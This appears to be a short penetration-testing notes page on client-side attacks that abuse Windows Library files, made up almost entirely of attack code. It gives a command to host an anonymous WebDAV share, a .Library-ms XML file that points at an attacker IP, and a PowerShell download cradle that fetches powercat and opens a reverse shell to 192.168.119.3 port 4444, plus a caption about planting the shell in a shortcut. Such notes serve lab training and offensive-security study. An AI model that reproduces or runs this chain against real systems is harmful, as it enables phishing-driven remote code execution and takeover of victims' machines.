# Client Side Attacks

## Abusing Windows Library Files

{% code title="Starting WsgiDAV on port 80" overflow="wrap" lineNumbers="true" %}
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
{% endcode %}

{% code title="Windows Library code for connecting to our WebDAV Share" overflow="wrap" lineNumbers="true" %}
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

```
{% endcode %}

{% code title=" PowerShell Download Cradle and PowerCat Reverse Shell Execution" overflow="wrap" lineNumbers="true" %}
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption><p>Creating a shortcut with PS reverse shell</p></figcaption></figure>
